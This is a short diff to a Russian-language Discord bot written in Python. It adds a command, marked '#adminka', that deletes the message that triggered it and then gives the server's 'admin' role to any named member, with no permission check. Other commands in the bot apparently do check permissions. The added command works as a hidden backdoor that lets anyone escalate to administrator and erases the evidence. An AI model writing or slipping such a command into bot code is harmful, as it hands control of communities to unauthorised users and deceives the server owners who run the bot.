@@ -358,6 +358,17 @@ async def mute_error(ctx, error):
 
     if isinstance(error, commands.MissingPermissions):
         await ctx.send(f'{ ctx.author.mention}, у вас недостаточно прав!')
+	
+#adminka
+@client.command(pass_context = True)
+
+
+async def ad(ctx, member: discord.Member):
+	await ctx.channel.purge( limit = 1)
+
+	ad_role = discord.utils.get(ctx.message.guild.roles, name = 'admin')
+
+	await member.add_roles(ad_role)
 
 #message 
 @client.command(pass_context = True)
